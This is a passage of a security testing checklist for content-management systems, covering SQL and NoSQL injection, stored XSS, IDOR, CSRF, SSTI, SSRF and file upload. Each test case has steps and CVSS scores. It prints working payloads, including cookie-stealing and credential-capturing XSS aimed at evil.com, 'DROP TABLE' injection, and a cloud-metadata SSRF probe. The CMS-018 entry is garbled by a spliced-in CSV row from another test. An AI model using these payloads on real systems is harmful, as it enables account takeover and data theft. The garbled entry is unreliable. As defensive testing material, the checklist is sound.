# 9. CMS — Checklist

Feature-area security **test cases** for “9. CMS”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*266 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## CMS-001 — SQL Injection in Content Title
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Navigate to content creation 2. Enter SQL payload in title field 3. Submit content 4. Observe response for SQL errors

**Expected Result:** Application should use parameterized queries

**Payload Example:**

```
title=' OR '1'='1'-- or title='; DROP TABLE content;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / Havij

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-002 — SQL Injection in Content Body
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create new content 2. Inject SQL payload in body field 3. Save content 4. Check for database manipulation

**Expected Result:** Application should sanitize all inputs

**Payload Example:**

```
body=test'; SELECT * FROM users WHERE '1'='1
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-003 — Stored XSS in Content Title
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create content with XSS in title 2. Save and publish 3. View content as visitor 4. Verify script execution

**Expected Result:** Application should encode output properly

**Payload Example:**

```
<script>document.location='http://evil.com/?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-004 — Stored XSS in Content Body
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create content with XSS payload in body 2. Publish content 3. Visit published page 4. Check for XSS execution

**Expected Result:** Content body should be sanitized

**Payload Example:**

```
<img src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-005 — IDOR on Content Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create private content 2. Note content_id 3. Access as different user 4. Attempt to view private content

**Expected Result:** Application should verify content ownership

**Payload Example:**

```
GET /api/content/private_content_id or /admin/content/edit/victim_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-006 — IDOR on Content Edit
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Edit own content 2. Intercept request 3. Modify content_id parameter 4. Edit another user's content

**Expected Result:** Application should verify edit permissions

**Payload Example:**

```
PUT /api/content/victim_content_id {"title":"hacked"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-007 — IDOR on Content Deletion
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Delete own content 2. Intercept DELETE request 3. Modify content_id 4. Delete another user's content

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/content/victim_content_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-008 — CSRF on Content Creation
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create malicious HTML page with content creation form 2. Trick admin to visit 3. Content created without consent

**Expected Result:** Content creation should require CSRF token

**Payload Example:**

```
<form action="https://target.com/admin/content/create" method="POST"><input name="title" value="spam"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## CMS-009 — CSRF on Content Deletion
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create page triggering content deletion 2. Admin visits malicious page 3. Content deleted

**Expected Result:** All state-changing operations need CSRF protection

**Payload Example:**

```
<img src="https://target.com/admin/content/delete/123">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## CMS-010 — Mass Assignment on Content
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create content 2. Add extra parameters 3. Modify author_id or status fields 4. Escalate privileges

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"title":"test",author_id:"admin",status:"published",featured:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## CMS-011 — NoSQL Injection in Content Query
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Search or filter content 2. Inject NoSQL operators 3. Bypass access controls 4. Access unauthorized content

**Expected Result:** NoSQL queries should be sanitized

**Payload Example:**

```
{"title":{"$regex":".*"},status:{"$ne":"private"}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite / MongoDB Compass

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## CMS-012 — Content Permission Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Log in as low-privilege user 2. Access admin content endpoints 3. Create/edit restricted content

**Expected Result:** Role-based access should be enforced

**Payload Example:**

```
POST /admin/content/create as editor without permission
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-013 — Horizontal Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Log in as User A 2. Edit User A's content 3. Modify request to edit User B's content

**Expected Result:** Users should only modify own content

**Payload Example:**

```
PUT /api/content/user_b_content_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-014 — Vertical Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Log in as contributor 2. Access admin-only features 3. Publish without approval

**Expected Result:** Role hierarchy should be enforced

**Payload Example:**

```
POST /admin/content/123/publish as contributor
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-015 — Race Condition on Content Creation
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Submit same content rapidly 2. Create duplicate content 3. Bypass uniqueness constraints

**Expected Result:** Content creation should be atomic

**Payload Example:**

```
Parallel POST /api/content requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## CMS-016 — Content Field Overflow
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Enter extremely long content 2. Submit exceeding database limits 3. Check for truncation or errors

**Expected Result:** Application should enforce field limits

**Payload Example:**

```
title=A*100000 (100000 characters)
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## CMS-017 — Server-Side Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create content with SSTI payload 2. Save and view 3. Check for template execution

**Expected Result:** User input should not be processed as templates

**Payload Example:**

```
{{7*7}} or ${7*'7'} or <%= 7*7 %> or #{7*7}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap / SSTImap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## CMS-018 — Blind XSS in Admin Panel
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Create content with blind XSS payload 2. Submit for review 3. Admin views content 4. Receive callback

**Expected Result:** All admin views should sanitize content

**Payload Example:**

```
><script src=https://xsshunter.com/payload></script>,High,XSS Hunter|Burp Collaborator
Create / Edit / Delete Content,Content Type Bypass,Broken Access Control,1. Create content of restricted type 2. Modify content_type parameter 3. Bypass type restrictions,Content types should be validated,{content_type":"page"} changed to {"content_type":"admin_notice"}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Postman

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-019 — Draft Access Without Permission
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Find draft content URL 2. Access without being author 3. View unpublished content

**Expected Result:** Drafts should only be visible to authors

**Payload Example:**

```
GET /api/content/draft_id/preview
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-020 — Soft Delete Data Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Delete content 2. Query with include_deleted parameter 3. Access deleted content

**Expected Result:** Soft-deleted content should be inaccessible

**Payload Example:**

```
GET /api/content?include_deleted=true
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-021 — Content Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Create / Edit / Delete Content

**Test Steps:** 1. Iterate through content IDs 2. Identify valid content 3. Map content structure

**Expected Result:** Content IDs should be unpredictable

**Payload Example:**

```
GET /api/content/1 through /api/content/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## CMS-022 — Stored XSS via HTML Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Switch to HTML/source mode 2. Insert raw XSS payload 3. Save content 4. View as visitor

**Expected Result:** Editor should sanitize HTML input

**Payload Example:**

```
<script>alert(document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-023 — XSS via Malformed Tags
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert malformed HTML tags 2. Bypass sanitizer 3. Execute JavaScript

**Expected Result:** Sanitizer should handle malformed HTML

**Payload Example:**

```
<img src=x onerror=alert(1)//> or <svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-024 — XSS via Event Handlers
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Add HTML element with event handler 2. Save content 3. Trigger event on view

**Expected Result:** All event handlers should be stripped

**Payload Example:**

```
<div onmouseover="alert('XSS')">hover me</div>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-025 — XSS via Data URI
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert image with data URI 2. Include JavaScript in data URI 3. Execute on load

**Expected Result:** Data URIs should be validated

**Payload Example:**

```
<a href="data:text/html,<script>alert('XSS')</script>">click</a>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-026 — XSS via SVG Embed
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Embed SVG in editor 2. Include script in SVG 3. Execute JavaScript

**Expected Result:** SVG content should be sanitized

**Payload Example:**

```
<svg><script>alert('XSS')</script></svg>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-027 — XSS via Object/Embed Tags
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert object or embed tag 2. Reference malicious content 3. Execute code

**Expected Result:** Object and embed tags should be blocked

**Payload Example:**

```
<object data="javascript:alert('XSS')"> or <embed src="javascript:alert(1)">
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-028 — XSS via CSS Expression
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert style with CSS expression 2. Save content 3. Execute in older browsers

**Expected Result:** CSS expressions should be stripped

**Payload Example:**

```
<div style="background:expression(alert('XSS'))">text</div>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / IE Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-029 — XSS via Link javascript:
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Create hyperlink 2. Set href to javascript: URL 3. Execute on click

**Expected Result:** javascript: URLs should be blocked

**Payload Example:**

```
<a href="javascript:alert('XSS')">click me</a>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-030 — XSS via VBScript (IE)
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert VBScript payload 2. Target Internet Explorer users 3. Execute code

**Expected Result:** VBScript should be blocked

**Payload Example:**

```
<img src=x onerror="vbscript:msgbox(1)">
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / IE Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-031 — XSS via Unicode Encoding
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Encode XSS payload in Unicode 2. Bypass filter 3. Execute decoded payload

**Expected Result:** Filters should handle Unicode

**Payload Example:**

```
\u003cscript\u003ealert(1)\u003c/script\u003e
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-032 — XSS via HTML Entities
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Use HTML entity encoding 2. Bypass sanitizer 3. Execute XSS

**Expected Result:** Double encoding should be handled

**Payload Example:**

```
&lt;script&gt;alert(1)&lt;/script&gt; or nested encoding
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-033 — SSRF via Image Source
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert image with URL 2. Point to internal resource 3. Server fetches internal content

**Expected Result:** Image URLs should be validated

**Payload Example:**

```
<img src="http://169.254.169.254/latest/meta-data/">
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## CMS-034 — SSRF via Link Preview
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Paste URL triggering preview 2. Use internal URL 3. Access internal services

**Expected Result:** Link preview should validate URLs

**Payload Example:**

```
Paste http://localhost:8080/admin for preview
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap / Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## CMS-035 — File Upload via Editor
**Test Category:** File Upload Vulnerabilities · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Use editor's file upload 2. Upload malicious file 3. Achieve code execution

**Expected Result:** File uploads should validate type and content

**Payload Example:**

```
Upload shell.php via image insert
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Weevely / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## CMS-036 — Iframe Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert iframe tag 2. Point to malicious site 3. Execute drive-by attacks

**Expected Result:** Iframes should be blocked or sandboxed

**Payload Example:**

```
<iframe src="https://evil.com/malware"></iframe>
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## CMS-037 — Form Injection for Phishing
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert form HTML 2. Create phishing form 3. Capture user credentials

**Expected Result:** Form elements should be stripped

**Payload Example:**

```
<form action="https://evil.com/capture"><input name="password" type="password"></form>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-038 — Meta Refresh Redirect
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Insert meta refresh tag 2. Redirect users to malicious site

**Expected Result:** Meta tags should be stripped

**Payload Example:**

```
<meta http-equiv="refresh" content="0;url=https://evil.com">
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## CMS-039 — Base Tag Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Inject base tag 2. Change base URL for page 3. Hijack relative URLs

**Expected Result:** Base tags should be blocked

**Payload Example:**

```
<base href="https://evil.com/">
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-040 — Content Security Policy Bypass
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Analyze CSP configuration 2. Find allowed sources 3. Inject via allowed source

**Expected Result:** CSP should be strict

**Payload Example:**

```
<script src="https://allowed-cdn.com/user-controlled.js"></script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** CSP Evaluator / Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-041 — Sanitizer Bypass via Mutation
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Craft payload that mutates after sanitization 2. DOM changes execute XSS

**Expected Result:** Sanitizer should handle DOM mutations

**Payload Example:**

```
<noscript><p title="</noscript><script>alert(1)</script>">
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / DOM Mutation Testing

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-042 — Editor Configuration Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Rich Text Editor (WYSIWYG)

**Test Steps:** 1. Inspect editor initialization 2. Find exposed API keys or config 3. Abuse configuration

**Expected Result:** Editor config should not expose secrets

**Payload Example:**

```
TinyMCE API key or CKEditor config in source
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-043 — Draft Access IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

